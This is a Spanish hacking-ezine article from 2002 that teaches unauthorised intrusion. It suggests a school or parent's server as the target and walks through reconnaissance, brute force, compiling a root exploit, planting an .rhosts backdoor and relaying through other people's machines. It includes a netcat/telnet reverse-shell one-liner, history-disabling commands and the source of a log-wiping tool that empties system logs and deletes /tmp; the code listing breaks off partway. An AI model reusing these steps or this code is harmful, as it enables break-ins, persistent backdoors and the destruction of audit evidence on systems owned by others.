---
title: "009"
ezine: "disidents"
---

# 009

**Ezine:** disidents

<div className="ascii-content">

```




                    -+-| DisidentS Hack Journal #3 |-+-







  ________________________________________________________________________
 |                                                                        |
 |  -+- Titulo_____: Exploits [009.txt]                                   |
 |  -+- Autor______: mitr3in                                              |
 |  -+- E-Mail_____: mitreindisidnt@yahoo.es                              |
 |  -+- Team_______: Disidents Espa±a 2002 -  Los fuera de la ley         |
 |  -+- KB_________: 74.8                                                 |
 |  -+- Tema_______: Hacking                                              |
 |________________________________________________________________________|



.==========================================================================.
|===========~ INDICE ~======================================================
|===========================================================================
|=~ 1.0  Comentario                                                        |
|=~ 1.1  Terminos basicos                                                  |
|=~ 2.1  Terminos basicos                                                  |
|=~ 2.1  Teoria                                                            |
|=~ 2.2  Ejemplo                                                           |
|=~ 3.1  Limpieza de registros                                             |
|=~ 3.2  Recomendaciones                                                   |
|=~ 4.1  Algunos exploits indispensables                                   |
|=~ 4.2  Exploits                                                          |
|=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=.
======================================================~ INDICE ~============
============================================================================



.==========================================================================.
|=======~ 1.0 INTRODUCCION ~================================================
|===========================================================================


-Son  las 12:34  de la ma±ana hoy  a sabßdo a nose  que de tal  mes, no  hay
novedades en el curro, te pica el gusanillo, no sabΘs lo que hacer en que te
entretienes,.... pues  miras  los textos, estudias  lo que se te antoja, que
haces?? PUes bien despuΘs de  toda una semana estresante te  decides a hacer
un texto para  sobre mmm, nose , que pues !!!! EXPLOITS ííí  que Buena idea,
asφ  pues  reconpilo lo que sΘ escribo un artφculo y  lo comparto  con  todo
aquel  que   tenga  curiosidad  en  aprender  o  desarrollar   mßs  aun  sus
conocimientos sobre exploits, este artφculo nose lo largo que serß ni lo que
me tardarß, sφ se es que lo voy a hacer con toda mi  voluntad para ese gente
que son como yo,piensan como yo y ante todo no hacen mal a nadie (como yo..)
Bueno, me voy a dejar de rollos y vamos a empezar a tocar un poco el tema de
los exploits, vale pe±a???

-Antes de Nada me  gustarφa deciros, que para esto  de los exploits, es casi
indispensable manejar un entorno Unφx, que cada uno se incline por el SO que
quiera bien por linux, o el que mßs le convenga ,  aunque claro tambiΘn cabe
decir que hombre la verdad tambiΘn se puede hackear y utilizar exploits bajo
gⁿin2,  y  no es  por  poner  abajo  ni nada al sistema  operativo  ese  que
tantos millones saca al cabo del a±o, solo es por deciros mi opini≤n, bueno,
una vez dicho esto, debemos  saber tambiΘn algunos comandos bßsicos  bien de
linux, o el sistema operativo que vayamos a utilizar, vaya ser  que entremos
en un sistema, y ni si quiera, sepamos, como se cambia  de directorio o como
podemos  borrar las huellas de un archivo  especifico, eso es bßsico. Bueno,
ahora bien, os voy a mostrar como os he dicho antes algunos comandos bßsicos
de linux en este caso:

.==========================================================================.
|=======~ 1.1 TERMINOS BASICOS ~============================================
|===========================================================================

# rm -->  Elimina un archivo
# cp --> Copia un archivo
# mv --> Mueve un archivo
# less o vi --> editor de texto
# chmod --> Permisos
# find --> Para buscar archivo /s
# chown --> Propiedad de de ficheros
# ls --> Muestra el contenido de un directorio
# chage --> Para anular cuentas de usuario
# at y batch --> Utilidad para programar tareas
# atq --> Muestra las tareas que hay pendientes
# chattr --> Cambiar atributos a los ficheros
# mount / umount --> Montar y desmontar unidades y .....
# bg --> Manda los comandos a un 2║ Plano
# fg --> Mandas los comandos a un 1║ Plano
# kill --> Para eliminar procesos
# finger --> Ver informaci≤n de usuarios
# nc --> Navaja Suiza


.===========================================================================.
|=======~ 2.1 TEORIA ~=======================================================
|============================================================================

- Pues bien, que es un exploit?? ┐Que entiendes por un  exploit??
Cuando se  utilizan los exploits?? PUes la verdad es  que ni yo mismo lo  sΘ,
pero bueno intentarΘmos explicar algunas de estas preguntas o mejor,  profun-
dizar en este tema que poco a poco se estß haciendo mßs importante y la mayo-
ria de  los textos que  hay estßn en ingles. Un exploit es  un programita que
se aprovecha de un bug (fallo de seguridad)  de un determinado programa  o SO
( sistema  operativo ), bien  este  programita se debe de compilar  tRansfor-
mArlo  A EjEcUtAbLE ) en la  mßquina  en la cual queremos  correr el exploit,
es  decir,   de la que  nos  queremos  aprovechar de su  fallo  de  seguridad
bien  sea  por  que  tiene  un bug  en  el  ftp,  en el  SO ,  o por  que  su
administrador  de  seguridad  sea  tan  vago, que ni siquiera sepa que  tiene
cuatrocentos mil bugs en su sistema y servicios abiertos a toda la pe±a ;))))
XDD pues bien,lo primero que debemos hacer es acceder a la mßquina de la cual
queremos aprovecharnos de  sus bugs para fines, siempre mmm,... (Bueno eso os
lo dejo a vuestro antojo ,jXDDDD).Sobre el tema de hackear esa maquina, o ese
server lo  siento pero no os voy acomentar como podeis conseguir acceso a ese
sistema ya que hay otros cuatrocentos mil textos de hacking para  que por  lo
menos  consigais acceder a una mßquina con los permisos que sean pero siempre
tienes  que  tener por  lo  menos permiso  para  poder bajarte, (copiarte) el
exploit que luego mßs tarde serß  compilado y  ejecutado,  ya  que gracias al
exploit que utilizemos podrΘmos tener todos los permisos que queramos,  no??,
que guayííí no se te sube la adrenalina?? XDD!!! Pues bien, ahora una vez que
hayamos accedido al sistema,y tengamos el  exploit listo para compilar lo que
haremos serß compilarlo(transformarlo a ejecutable para que se pueda ejecutar
en la mßquina ese programita tan maravilloso que nos darß la cuenta de un tal
no se como se llama  root, kreo no se┤pero, creo que  era la  cuenta  de  ese
hombre XDD!), bien estamos delante de nuesttra mßquina que en realidad no es,
ya que estamos dentro de un server o  quien sabe lo mismo  delante del server
de tu empresa, amigo,...XD, bueno, una vez dicho esto nos disponemos a compi-
lar el programa, Uy bien y esto como se hace si ni si quiera tengo zorra idea
de como programar y menos de  compilar joder con los programs estos,pues bien
,eso es facil,para compilar un programa de C normalmente .c en entornos unix,
solo tendrΘmos que  escribir gcc exploit.c y nos saldrß o  nos  devolvera  un
programa llamado a.out es es el ejecutable,el programita ese que nos darß los
permisos del hombre ese tan importante root,XD, pues bien ahora,ejecutamos el
a.out # ./a.out y mmmmmmm,tachan!!!!!!! pReMIo  a  Ganado  USteD  una  Mu±eCa
ChoChoNa, no hombre eso es  broma,  ibamos a estar nosotros aqui tanto tiempo
para  mu±equita  de  esas.  Pues  ahora, solo  queda  decir que una  vez   el
programita ese nos ha convertido  en el hombre ese que  TIENE MUCHOS PERMISOS
Y HACE LO QUE QUIERE (como no preocuparse de la seguridad de la empresa).

Una  vez  dicho todo esto,  cabe  decir que  nunca  nos devemos olvidar de lo
que hemos hecho, ni  como, ni cuando, en  definitiva que hemos ido dejando un
rastro que hasta un  bebe con  pa±ales sucios, chupando aun la teta de lamama,
podrφa ver quien ha entrado en  ese servidor,  a que  hora, que  es lo que ha
echo, y  por  que  no  donde  vivimos, .., -X:(  bueno siempre  y  cuando  el
administrador no fuese tan vaGo CoMo deciamos ants XDD.


Bueno y  entonces  que  hacemos  ya que  hemos accedido al sistema, nos hemos
colado como si fuesemos, un colega  muy importante(root),y visto (curioseado)
lo que nos ha salido de  mmm.,. mXD,  pero no Hemos vorrado las  huellas esas
de chocolate que nos delatan, bueno no pasa nada PiSha, las borramos y punto,
ahora que somos  Tan Importantes en  ese servidor, no nos van a decir  que no
podemos borrar  nuestras huellas, porque  nos iban a negar eso,  cuando hemos
hecho up! ups! que  nada, nada.XDDD Bien, normalmente existen varios archivos
que guardan informaci≤n de los accesos al ese sistema,normalmente son 4, pero
por  el que  mßs nos  devemos preocupar es por uno,ya que  este no lo podemos
modificar asφ como asφ,ya que el archivo dichoso este de .mm,.estß en binario
que mala suerte tios,y ahora que hacemos y si el VaGo ese le dß por hacer al-
go un dφa y el archivo ese nos delata , uff!!! que mal huele eso X:)( no, pe-
ro si nos hemos bajado un  exploit al server,  y ademßs somos tan importantes
(root) por que no bajarnos otro programita que nos borre del registro  ese...
"""EEUUUUReeeeeeEEEeKKKKaaAa!!! je, XDDD pues sφ,tambien podemos ejecutar ese
programita  y listos,  asunto  arreglado, hemos  curioseado en el server  que
queriamos,el  administrador con lo vAgO que es ni se  ha dado cuenta y ademßs
hemos limpiado nuestros registros, aunque no siempre queda todo limpio.

Los exploits,  nos  lo podemos encontrar por hay  en multitud  de pßginas  de
seguridad,tales como  secureroot,astalavista(buscador  por excelencia hacker)
,...a. pero siempre nos debemos de asegurar de dar con el del bug que estamos
buscando,  explicßndome  un poco mejor, que tenemos tenemos que tener cuidado
sobre que exploit utilizar no vayamos a hacerlo  a lo loco y en cuanto veamos
uno para el sendmail eeAA, pues este mismo, no, no ,  debemos  asegurarnos de
la  versi≤n que es y poco a  poco todos los que vayamos  pillando  por hay en
las diferentes paginas o  donde sea, irlos guardando para  nuestra biblioteca
personal de exploits,bueno eso lo digo yo como opini≤n, ustedes haced  lo que
querais, XDD, bueno, tenemos  que  tener en  cuenta siempre que no  todos los
exploits  que encontremos  nos van a valer, ya  que  lo  mismo le ha dado  al
administrador por parchear algun programa o algo,asφ pues debemos buscar otra
vulnerabilidad, bueno, todo esto os  lo voy  a poner en un peque±o  ejemplito
con el  que vamos a practicar o por lo menos a ver  si nos hemos enterado  de
algo sobre como van los exploits, y todo el rollo ese,.


.==========================================================================.
|=======~ 2.2 EJEMPLO ~=====================================================
|===========================================================================

En primer lugar, elegimos el objetivo que en este caso va a ser mm pues,...
El servidor del insti, el servidor de tu viejo o yo que se,  pero todo lo que
hagais siempre bajo  vuestra responsabilidad,  que luego  no vengais diciendo
es que me dijo,que nose que , eh??┐ XDDD,  bien,je, (esto es solo un ejemplo,
lo que  hagais o  el objetivo que elijais va vuestra  responsability  XDDEd),
bueno,  una  vez que ya  hemos elegido  el  servidor lo  primero que  debemos
saber es la ip del insti (server),  bueno supongamos que no la sabemos  o que
aunque  tengamos  acceso  fisico  a  la  escuela  no  la vemos, co±o si pongo

# netstat -n

y  me dice 192.168.1.13, y esta es la de la red, esta no nos vale, pues bien
hacemos  lo  siente nos mandamos un e-mail a  nuestra direcci≤n de e-mail, y
listo  ahora  en  cuanto lleguemos a nuestra home,  miramos nuestro  e-mail,
propiedades y BinGo , ya tenemos la ip, ahora  solo nos queda todo  lo demßs
que es en definitiva todo. Supongamos que la  ip es :  64.1.1.13 ahora bien,
empezamos a maniobrar y a entrar en materia:

Lo  primero  que debemos hacer es echarle un vistazo a los puertos que tiene
abierto el server ese y el sistema operativo que utiliza,que bien lo podemos
hacer utilizando el nmap o cualquier otro scaneador de puertos el  nmap para
ver sistema operativo o por intuici≤n o con cualquier otro progamita de esos
que hay muchos como queso par linux,....

#nmap -O 64.1.1.13          (Para ver el SO que esta utilizando el servidor)
El sistema operativo tambiΘn se puede averiguar viendo los puertos que tiene
abiertos el servidor,  por ejemplo si tiene entre ellos el 139, tiene muchas
posibilidades,  de que sea tenga W9X,  y si  tiene  135  y  139  seguramente
este basado en NT,...

#nmap -sT 64.1.1.13            (nmap tiene muchas opciones de scaneo esta es
                                la mßs simple,  y  tambiΘn  con  la que  mßs
                                pronto nos  pueden ver que estamos scaneando
                                sus puertos por  eso, tambiΘn  podemos hacer
                                otro tipo de scaneo, que es silencioso o asφ
                                por lo menos lo podemos llamar, que serφa :
                                           #nmap -sS 64.1.1.13
                                este  scaneo  requiere  privilegios de root)

Algunos comandos del nmap

-	o archivo.txt --> Nos  guarda los resultados  obtenidos en un archivo
                          determinado

-	O --> Nos muestra el SO que usa

-	D --> Se±uelo  para  saturar el sitio objetivo con informaci≤n super-
              flua

-	Ident -->  Conocer la  identidad de un  usuario en una  conexi≤n TCP,
                   puerto a la escucha 112.

Algunos comandos de la Navaja Suiza (Netcat o nc )

-	v --> Salidas detalladas, mßs detalladas - vv

-	z --> Gnera E/S en nodo cero

-	w2 --> Valor de tiempo de espera en cada puerto

TambiΘn podemos sacar alguna informaci≤n del server,
#finger @64.1.1.13
#whois 64.1.1.13
#rcpinfo -p 64.1.1.13

Otra  Utilidad  del Netcat,  para  crear un canal trasero o  telnet  inverso

# nc -1 -n -v -p 80 α Con esta opcion creamos el canal Trasero 1
# nc -1 -n -v -p 25 α Con esta otra, creamos el segundo canal

# /bin/telnet &lt;IP> 80 | /sbin/sh/ | /bin/telnet &lt;IP> 25 α
Nos da acceso al canal


Una vez que hemos hecho el escaneo de puerto nos  dirß los puertos que tiene
abiertos,  a raiz de hay podremos  empezar a buscar informaci≤n  y como  no,
empezar  a  investigar un poco. Ya  sabemos  un  poco mßs  de ese  servidor,
podriamos decir que tiene  mm,  no se,  para empezar,  que  tienen  pues los
siguientes puertos abiertos:

# 21, 23, 25, 111, 6339,  bueno o los que tenga abiertos, la cuestion, a
                          investigar cada uno de ellos.

Ahora que ya sabemos el sistema operativo que utiliza, los puertos que tiene
abierto, y poco mßs,  podemos mirar  ahora,  las particiones  que tiene  que
nunca se sabe, lo mismo luego nos puede valer par mm.................

# showmount -e 64.1.1.13 ( Nos servirß para ver los directorios que se
 estßn compartiendo)

Bien, ya sabemos algo mßs, ahora podiamos echarle un vistazo a los programas
que estan rulando en el server en este momento,

#

Bueno, vamos bien por  lo pronto n0?? Lo vamos cojiendo todo??,  pues ahora,
que  tal  si  le echamos un vistazo  y  le  hacemos un  traceroute no?? Asφ,
ademßs si tenemos suerte, nos podemos encontrar con algun numero de telefono,
a nombre de a quien estß registrado y quien sabe luego nos pueda servir para
ingeniria social,  ..etc, etc,  # traceroute 64.1.1.13   (Con esto vemos por
que maquinas o servidores  pasa el  ordenador  o  el  servidor ese), tambien
podemos  utilizar otro  tracer  o el de windows,  o  el mm, nose,  a vuestra
elecci≤n , (neotracer para gⁿin2, ) o tracert para ms-dos,...

Mmmmm, que mßs, pues ahora bien,  ya visto  hasta ahora  todo  esto ,  queda
lo  mßs  difφcil,  intentar  entrar en la mßquina 64.1.1.13, pero bueno todo
lo  que hemos hecho para sacar un poco de informaci≤n,  se podia  haber echo
mßs complejo, eso os lo dejo para que ustedes investiguen y vean poco a poco
tambiΘn podriamos ver los usuarios que estßn en ese momento, o otra cosa muy
util a la hora de hackear por si no es en nuestro pais es saber la hora  que
es allφ,para ver si estßn durmiendo, si el administrador esta en plena faena
o quizßs quien sabe...mm...

Ahora que ya tenemos lo que he dicho antes,  podemos hacer varias cosas, una
de ellas, serφa realizar un ataque por fuerza bruta a travΘs de telnet, ftp,
rlogin, SSH, POP, http, etc,..,  lo  que  pasa es  que este tipo de ataques,
se suele hacer  ya a la  desesperada aunque muchas  veces nos funciona  pero
claro que sφ con mucha paciencia tios, que si no... nada de nada, aquφ  todo
con  paciencia  y  poquito  a  poco,  tambiΘn,  podemos ver los usuarios que
existen  para  ese  sistema  operativo  por defecto  y  quizas,  quien sabe,
lo mismo cuela alguno no?? O anonymous , que tambiΘn la mayorφa de las
veces nos deja por lo menos ufff, hacer cositas,jejiejeje.

Bueno bien, hacemos empezamos a maniobrar:-XDddddddd

# telnet  64.1.1.13 (Puerto que tenφa abierto)

Dependiendo el telnet a que puerto lo realicemos,  obtendremos distinto tipo
de informaci≤n o de acceso, por ejemplo, si hacemos :

# telnet 64.1.1.13  25   α

Podremos ver el servidor de correo que esta rulando,ademßs de acceder quizas
como  usuario anonymous,  tambiΘn  haciendo # telnet 64.1.1.13  ( )  Veremos
la hora que es  para  esa  maquina, todo esto claro siempre y cuando hagamos
telnet a los  puertos que estΘn abiertos y si el firewall,  si tiene nos  lo
permite  hacer.,XDDDD , Una  vez hecho  esto y  tener ya tope de informaci≤n
lo  que debemos  hacer ahora  es  intentar entrar  en  la  mßquina esa  bien
utilizando la tΘcnica que sea, ataques de fuerza bruta,negaci≤n de servicios
, ingenieria social, ..

Supongamos  que ya hemos conseguido a  traves de alguna tΘcnica de las antes
mencionadas  o otra  cualquiera, entrar  en  el  ordenador  objetivo

< anonymous@64.1.1.13>  Una  vez  estamos  dentro lo  que debemos hacer serß
llevarnos nuestro exploit a esta mßquina con el comando put para que podamos
ejecutar  el  exploit, para  llevarnos  varios ficheros  utilizariamos mput.
Sin  olvidarnos  que no solo debemos subirnos el  exploits, sino tambien, el
exploit para la limpieza de registro que luego se nos vaya a olvidar o bueno
sino a mano, con destonillador y alicates.

< anonymous@64.1.1.13  > # gcc  -o exploit exploit.c
      ( esto nos compilarß el exploit para su posterior ejecuci≤n)

&lt;anonymous@64.1.1.13 > #  ./exploit
                          (Ejecutamos el exploit)
bug exploit successfully!
boeyly
Wallllaaaaaaaaaaaaa.

&lt;root@64.1.1.13 > #   Ya somos root aquel hombre tan importante que os decia
                      que podφa hacer casi lo que querφa jeje,ejej,.XDDD.
        ..........   .............        ..............

Ahora lo  que hagais va vuestra responsabilidad,  y  ojo con lo  que  hagais
tios.... Una  vez, hayais  echo lo  que querais,  bien  podeis  utilizar  el
programita  ese  que os he dicho para  borrar las huellas, o bien, hacerlo a
mano, empezando por modificar los archivos   Bueno una vez limpiado nuestras
huellas, podemos hacer varias cosas, desde dejar un troyano para que podamos
tener  acceso  a  esa  maquina  en  un futuro  o largarnos  y  todo acabado,
si vuestra opci≤n es la de salir ea, pues # quit  o ctrl. - C  mßs rßpido  y
asunto acabado, pero si vuestro ego, quiere mßs y vuestra adrenalina quereis
que suba en un futuro otra vez, lo que debemos hacer es dejar un  troyano en
esa mßquina con mucho cuidado se vaya a dar cuenta el adm.Un troyano podemos
hacerlos nosotros o bien utilizar uno  ya dise±ado, si  lo realmente  nos lo
queremos fabricar bueno enrealidad no  hay que fabricar nada , solo dejarnos
una puerta  abierta a  nuestro antojo para cuando queramos pasar, jejeXDDDD,
para hacer eso que os digo, lo que debemos haces es:

En  primer lugar, serß crear  un  archivo  rhost, y ahφ  poner el nombre  de
usuario el  cual queremos que pueda acceder al sistema y este cuando le haga
un rlogin, no le pedirß contrase±a, lo que hacemos realmente es decirle a la
maquina mendiante ese archivo, es que  tenga confianza en ese usuario  y asφ
pues acceder a su sistema cada vez que queramos.  Todo esto lo debemos hacer
antes  de  limpiar  las  huellas del  registro, y asφ   pues  al  limpiarlas
estaresmos limpiando tambien este ultimo rastro que hemos ido dejando,aunque
el dejar un troyano, a su vez, indica tambiΘn, dejar mßs huellas,pero bueno,
habrß que arriesgarse no?,esto cada uno que haga lo que quiera con su vida y
su ordenador ,XDDD. Aunque como siempre os digo estas cosas, funcionan si el
administrador  no las tiene  un poco protegidas  claro estß,  lo mismo  pasa
ejemplo peri≤dicamente de borrar los  archivos r* o encryptarlos o ..etc,...

.==========================================================================.
|=======~ 3.1 LIMPIEZA DE REGISTROS ~=======================================
|===========================================================================

Editar  o  Modificar  archivos:  messages,  secure  ( sitios  o  usuarios no
reconocidos  o  intentos  de  conexion ), xferlog  (  Actividad  anormal  de
transferencia de archivos), wtmp (guarda un registro, de cada usuario que se
introduce  o  sale del sistema), lastlog (inicios de sesion extra±os), utmp,
normalmente ubicados en /var/log, aunque no siempre estßn en ese directorio,
ya que depende del SO y del administrador.

Wtmp --> Este Archivo estß en binario, con lo cual su  limpieza serß un poco
         mas difφcil, para su limpieza, podemos utilizar algun programa como
         podrφa ser el wzap.c

	# /var/log/who ./wtmp

	# /opt/wzap
      Seguidamente introduciriamos el usuario a limpiar del registro,

	# copy wtmp.out  a wtmp α
     Asφ con esto, habremos limpiado nuestras huellas de este archivo en
     binario (wtmp).

TambiΘn debemos de tener en cuenta los propios mandatos que utilizamos que se
pueden  guardar  automßticamente  en  /bin/bash/bash_history,  si  al atacar,
desactivamos  la  historia de la shell,  no generaremos archivos  historicos,
para desactivar esta opcion, utilizarφamos:

# unset HISTFILE; unset SAVEHIST
Para restablecer la fecha y hora del  ultimo acceso al sistema, usad "touch"


Bueno, pues que  tal os ha  parecido el ejemplo??    Espero  que  lo  hayais
entendido todo un poco mejor, ahora a continuaci≤n os  darΘ algunos exploits
y programitas para vuestra biblioteca particular, bueno, darle un buen uso a
esta informaci≤n.


.==========================================================================.
|=======~ 3.2. RECOMENDACIONES ~============================================
|===========================================================================


Siempre habremos dejado algo que nos pueda delatar, asφ que como opini≤n mia,
olvidate de hacer destrozos, y nunca te metas en grandes compa±ias o servido-
res que  se  puedan gastarse  el dinero  en  buscarte,  y creeme  si  quieren
te encontrarßn, y pss para que, para que luego te arrepientas  de todo lo que
has hecho y nunca mßs puedas coger un ordenador no pisha, mejor NO, asφ X que
OJO ::::;;;; )) con lo que haces colega.

Tener mucho cuidado con las grandes compa±ias, ya que se pueden permitir  el
lujo, de gastarse dinero en perseguiros. TambiΘn debeis tener  mucho cuidado
con la BSA y nunca confieis  en nadie,  el que menos os penseis  os dara por
donde menos lo espereis,  otra cosa  a  tener en cuentas es que  siempre que
podais jakear con cond≤n (jakear con cond≤n:hackear un sity o una maquina la
de tu vecino  por  ejemplo, utilizarla,  y  a  travΘs de  ella, hacker donde
querais),  asφ,  serß  mas dificil que   os sigan el rastro,  tambiΘn podeis
utilizar  para esto proxys para la ocultaci≤n de vuestras ips, que luego nos
podrφan delatar ;) XDd

Ahora a continuaci≤n  os darΘ algunos exploits, para que os  entretengais un
poquito y siempre todo lo que hagais o el uso que le deis a esta informaci≤n
serß bajo vuestra responsabilidad, ya que yo no me hago cargo  de nada de lo
aquφ expuesto solo me  dedico a mostraros informaci≤n que es  gratuita  para
todo el mundo y  que todo el mundo deberφa  saber, Suerte  Pe╤a , y rEcOrDaR
NunCa  sUbeStImeIS  al  projimo,tambien me  gustarφa deciros, que  nunca  os
vendrφa  mal  saber algo sobre  cracking o lenguajes de programaci≤n, ya que
todo  eso  ayudarφa bastante  a  entender  lo que hacen  los exploits,  o  a
crearselos uno mismo.

.==========================================================================.
|=======~ 4.1 ALGUNOS EXPLOITS ~============================================
|===========================================================================

A medida que avanzan los dias, avanzan los exploits y los fallos de seguridad
(bugs),  ya que continuamente estßn saliendo nuevos bugs, normalmente,  nunca
tendremos  nuestro sistema protegido  totalmente,  ya  que  cada  dia  minuto
que pasa o cada hora aparece una nueva vulnerabilidad y nos os creais eso que
dicen que no ese SO no tiene puertas abiertas,o quees inmune contra todo tipo
de ataques ya que es mentira, bien tarde una semana, un mes o lo que sea,pero
al final siempre  se encontrarß alguna  vulnerabilidad bien sea  en el c≤digo
algun error, o alguna  puerta  que  se  hayan dejado abierta XDD ;), Asi  que
nuestro objetivo es estar al dia, y cada vez que  nos enteremos  de algun bug
nuevo intentar parchearnos para no correr riesgos de intrusion.

Por eso, ahora os voy a mostrar algun ejemplo de exploits, aunque ya sebeis,
debeis  buscar el que os haga falta,  porque  hay la tira por ahφ,  y  nunca
utilizeis  uno  por utilizar, pero bueno haya vosostros, ah! y bueno la tra-
ducci≤n de los comentarios de los exploits  ha sido facilitada por  damicita
hi! princess! ;) q bueno, como  no todos  dominamos perfectamente  el ingles
puess... xddD  saluditos.

Este es un programita el cual te permitirß la limpieza de en el registro del
sistema facilitado por el Team disidents .




<++> disidentszapp.c


	           DISIDENTS - LOS FUERA DE LA LEY 2001
                        DISIDENTSZAPP by DDiego
--INSTALACION:
1¬ Unos guantes, una botella de vodka y un compilador
2¬ gcc -o disidentszapp disidentszapp.c   - Si no sabias lo de los guantes
y el vodka, no creo que lo necesites
-- RECOMENDACIONES
Ir 1¬ a por los servicios ftpd, smtp etc y luego darle a la A
-- AYUDA: Si quereis que incluya algun log de otro servicio en el zapper etc, podeis
escribir a disidents@hotmail.com o disidents@yahoo.es, un saludo


http://www.disidents.int-ltd.com






#include &lt;stdio.h>
main()
{
int c;
int d;
system ("clear");
printf("\n\033[1;31m  \n");
printf("\n------------------ DISIDENTSZAPP by DDiego ---------------------\n");
printf("\n------------- ES YA LA HORA DE LIMPIARNOS EL CULO --------------\n");
printf("\033[0;0m");
printf("\n\033[1;33m1010101010--Menu--1010101010\033[0;0m");
printf("\033[1;30m\n");
printf(" A BORRA TODO LOS LOGS   de opciones (B, C, D, E, F, G,H)\n");
printf(" B BORRA TODAS LAS ENTRADAS Y SALIDAS\n"); /*/var/log/wtmp */
printf(" C BORRA LAS EL REGISTRO DE CONEXION\n"); /* /var/log/lastlog  */
printf(" D BORRA ULTIMAS ENTRADAS\n"); /*/var/run/utmp */
printf(" E BORRA EL FTP server logfile, usado por wu-ftpd\n");
/*var/log/xferlog */
printf(" F BORRA MESSAGES\n"); /*/var/log/messages*/
printf(" G BORRA LOG  secure\n"); /*/var/log/secure*/
printf(" H BORRA archivos tmp\n"); /*/tmp */
printf(" I BORRA logs de proftpd\n");
printf(" J BORRA logs de apache + SSL\n");
printf(" K BORRA logs de sendmail\n");
printf(" L BORRA logs de qmail\n");
printf(" M BORRA logs de SMB\n");
printf(" N BORRA logs de fingerd\n");
printf(" O BORRA logs de  SSH\n");
printf(" P BORRA logs de  tftp\n");
printf(" Q BORRA logs de  qpopper\n");
printf(" R BORRA logs de  news\n");
printf(" S BORRA logs de  xmail\n");
printf(" T BORRA logs de  thttpd\n");
printf(" U BORRA logs de  Ncftpd\n");
printf(" V BORRA logs de  Telnet\n");
printf(" W BORRA logs de  auth  y auth-priv\n");
printf(" X BORRA logs de  Tripwire\n");
printf("\033[0;0m");
printf("\033[0;32m  ");
printf("---- BORRA logs de otros sistemas - Solaris, HP, IRIX, AIX -------");
printf("\033[0;0m");
printf("\033[1;34m \n");
printf("1 - Solaris (SUN)\n");
printf("2 - HP-UX  (HP)\n");
printf("3 - IRIX (Silicon Graphics)\n");
printf("4 - AIX (IBM)\n");
printf("\033[1;37m5 SALIR a tomar un disparo, tengo sed\033[0;0m\n");

c = getchar ();
switch (c) {
case 'A':
system("echo has hecho una  buena eleccion :D");
system("echo elimininando /var/log/wtmp");
system("cat /dev/null > /var/log/wtmp");
system("echo elimininando /var/log/lastlog");
system("cat /dev/null > /var/log/lastlog");
system("echo eliminando /var/run/utmp");
system("cat /dev/null > /var/run/utmp");
system("echo eliminando /var/log/xferlog");
system(" cat /dev/null  > /var/log/xferlog");
system("echo eliminando /var/log/messages");
system(" cat /dev/null  > /var/log/messages");
system("echo elininando /var/log/secure");
system("cat /dev/null  >/var/log/secure");
system("echo eliminando /tmp");
system("rm -fr /tmp");
system("echo eliminando  /root/.bash_history");/*nota pueden estar
                            en otro sitio segun esto tu has entrado como root*/
system("cat /dev/null  > /root/.bash_history"); /*bash*/
system("echo eliminando sh_history");
system("cat /dev/null  >/root/sh_history");  /*sh*/
system("echo eliminando .sh_history");
system("cat /dev/null  > /root/.sh_history");   /*hsh*/
system("echo eliminando  /root/.cshrc  "); /*csh*/
system("cat /dev/null  >  /root/.cshrc ");
system("echo eliminando  /root/.tcshrc"); /*csh*/
 system("cat /dev/null  > /root/.tcshrc");

system("echo eliminando /root/.history"); /*csh*/
system("cat /dev/null  > /root/.history ");
system("echo eliminando syslogd");
system("killall -HUP syslogd");
system("echo ya puedes tomarte un cubata y sonreir");
break;
case'B':
system("echo eliminando /var/log/wtmp");
system("cat /dev/null  > /var/log/wtmp");
break;
case 'C':
system("echo eliminando /var/log/lastlog");
system("cat /dev/null  >/var/log/lastlog");
break;
case 'D':
system("echo eliminando /var/run/utmp");
system("cat /dev/null  >/var/run/utmp");
case 'E':
system("echo eliminando /var/log/xferlog");
system("/cat /dev/null  > /var/log/xferlog");
break;
case 'F':
system("echo eliminando /var/log/messages");
system("cat /dev/null  > /var/log/messages");
break;
case 'G':
system("echo eliminando /var/log/secure");
system("cat /dev/null  > /var/log/secure");
break;
case 'H':
system("echo eliminando /tmp");
system("rm -fr  > /tmp");
break;
case 'I':
system("echo eliminando logs de proftpd");
system("cat /dev/null  >  /var/log/proftpd.log");
system("cat /dev/null  >  /var/log/access.log");
system("cat /dev/null  >  /var/log/auth.log.log");
system("cat /dev/null  >  /var/log/proftpd/xferlog.legacy");
system("cat /dev/null  >  /var/log/proftpd.access_log");
system("cat /dev/null  >  /var/log/proftpd.xferlog");
system("cat /dev/null  >   /var/log/proftpd/extended.log");
break;
case 'J':
system("echo eliminando logs de apache");
system("cat /dev/null  >  /var/log/httpd/error_log ");
system("cat /dev/null  >  /var/log/httpd/access_log");
system("cat /dev/null  >  /etc/httpd/logs/access_log");
system("cat /dev/null  >  /etc/httpd/logs/error_log");
system("cat /dev/null  >  /var/log/cgi.log");
system("cat /dev/null  >  /var/log/httpd/cgi.log");
system("cat /dev/null  >  /var/log/httpd-cgi.log");
system("cat /dev/null  >  /var/httpd/logs/ssl.log");
system("cat /dev/null  >  /var/log/httpsd/ssl.access_log");
system("cat /dev/null  >  /var/log/httpsd/ssl_log");
system("cat /dev/null  >  /var/httpd/logs/ssl.log");
system("cat /dev/null  >  /tmp/ssl.log");
system("cat /dev/null  > /var/log/httpsd/ssl.access_log");
break;
case 'K':
system("echo eliminando logs de sendmail");
system("cat /dev/null  >  /etc/mail/access");
system("cat /dev/null  > /var/log/sendmail.log");
system("cat /dev/null  >/var/log/mail.log");
break;
case 'L':
system("echo eliminando logs de qmail");
system("cat /dev/null  > /var/log/qmail");
system("cat /dev/null  > /var/log/smtpd");
break;
case 'M':
system("echo eliminando logs de SMB");
system("cat /dev/null  > /var/log/samba");
system("cat /dev/null  > /var/log/samba/smb.log");
system("cat /dev/null  > /var/log/samba-log.%m ");
system("cat /dev/null  > /var/lock/samba");
break;
case 'N':
system("echo eliminando logs de finger");
system("cat /dev/null  >  /var/log/finger.log");
break;
case 'O':
system("echo eliminando logs de SSH");
system("cat /dev/null  >  /var/log/ssh.log");
system("cat /dev/null  >  /var/adm/ssh.log");
system("cat /dev/null  >  /root/.Xauthority");
break;
case 'P':
system("echo eliminando logs de tftp");
system("cat /dev/null  > /var/log/tftp.log ");
break;
case 'Q':
system("echo eliminando logs de qpopper");
system("cat /dev/null  > /var/log/poplog ");
break;
case 'R':
system("echo eliminando logs de news");
system("cat /dev/null  > /var/log/news.all");
system("cat /dev/null  > /var/log/spooler");
system("cat /dev/null  > /var/log/news");
system("cat /dev/null  > /var/log/news/news");
